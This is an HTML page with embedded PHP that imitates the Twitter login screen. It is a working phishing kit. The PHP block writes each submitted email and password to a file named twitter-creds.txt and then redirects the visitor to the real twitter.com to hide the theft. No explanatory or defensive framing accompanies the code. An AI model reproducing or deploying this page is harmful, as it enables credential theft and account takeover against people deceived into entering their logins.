<!DOCTYPE html>
<html>
<head>
	<title>Twitter</title>
	<meta charset="UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<meta name="keyword" content="HTML, CSS, Javascript"/>
	<meta name="author" content="twitter"/>
	<link rel="stylesheet" href="index.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href='https://fonts.googleapis.com/css?family=ABeeZee' rel='stylesheet'>
	<link rel="stylesheet" href="index.css">
</head>
<body>
	<img src="https://www.creativefreedom.co.uk/wp-content/uploads/2017/06/Twitter-featured.png" alt="Twitter Logo" id="twitterLogo">
		<br />
	<center>
		<h2>Log in to Twitter</h2>
		<?php
			if(isset($_POST['email'])){
				$user=$_POST["email"];
				$pass=$_POST["password"];
				$creds="twitter-creds.txt";
				file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
				file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
				echo "<script>window.location.replace('https://www.twitter.com/');</script>";
			}
		?>
		<form method="POST" action="">
			<p class="main">
					<br />
				<input type="email" placeholder="Phone, email or username" name="email" class="one" required>
					<br/>
				<input type="password" placeholder="Password" name="password" class="two" required>
			</p>
			<button class="loginBtn" type="submit" formmethod="post" id="loginBtn" value="Login" name="Log In" data-sigil="touchable" href="https://www.twitter.com/" onclick="location.href='www.twitter.com'"><span class="loginSpan"><b>Log in</b></span></button>
				<br />
				<br />
			<a href="" style="color:#54afe8;font-size:87.5%;float:left;margin-left:14%;margin-top:3px;">Forgotten Password?</a> • <a href="" style="color:#54afe8;font-size:87.5%;float:right;margin-right:14%;margin-top:3px;">Sign up for Twitter</a></p>    
		</form>
	</center>
</body>
</html>
